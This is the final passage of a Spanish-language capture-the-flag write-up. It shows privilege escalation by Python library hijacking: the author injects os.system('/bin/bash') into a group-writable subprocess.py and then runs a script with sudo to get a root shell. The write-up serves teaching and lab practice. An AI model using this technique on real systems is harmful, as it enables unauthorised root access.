    mensaje = f"Elohim: I have detected an intruder: {', '.join(usuarios_conectados)}"
    
    # Enviar el mensaje utilizando el comando 'wall'
    subprocess.run(['wall', mensaje])

enviar_mensaje_usuarios_conectados()
~~~

No tenemos permisos para manipular el fichero, pero vamos que llama a la librería subprocess, por lo que vamos a localizarla e indagar más.

~~~bash
elohim@principle:~$ find / -name "subprocess.py" -ls 2>/dev/null
    19941     84 -rw-rw-r--   1 root     sml         85746 Mar 13 08:18 /usr/lib/python3.11/subprocess.py
    20391      8 -rw-r--r--   1 root     root         7405 Mar 13 08:18 /usr/lib/python3.11/asyncio/subprocess.py
elohim@principle:~$ id
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
~~~

Como pertenecemos al grupo sml, tenemos permisos de escritura, así que todo apunta a un python library hijacking.

Bastará con introducir en el fichero subprocess.py la instrucción `os.system("/bin/bash")`.

Finalmente si ejecutamos `sudo python3 /usr/lib/python3.11/subprocess.py` obtendremos el root:

~~~bash
elohim@principle:/opt$ sudo python3 reviewer.py 
root@principle:/opt# cd /root
root@principle:~# ls
root.txt
root@principle:~# cat root.txt
CONGRATULATIONS, the system has been pwned!
          _______
        @@@@@@@@@@@
      @@@@@@@@@@@@@@@
     @@@@@@@222@@@@@@@
    (@@@@@/_____\@@@@@)
     @@@@(_______)@@@@
      @@@{ " L " }@@@
       \@  \ - /  @/
        /    ~    \
      / ==        == \
    <      \ __ /      >
   / \          |    /  \
 /    \       ==+==       \
|      \     ___|_         |
| \//~~~|---/ * ~~~~  |     }
{  /|   |-----/~~~~|  |    /
 \_ |  /           |__|_ /


+w*************rg/
~~~

Máquina finalizada. Superamos nuevamente el write-up más largo hasta la fecha. 

Ha sido una nueva experiencia para mí, pero muy gratificante donde se aprenden muchas cosas también. Espero que sea la primera de varias y que os haya gustado.

Agradecer a **sML** por subirla a la plataforma y también a los amiguetes de "0G_h4x0r2" por hacer de betatesters.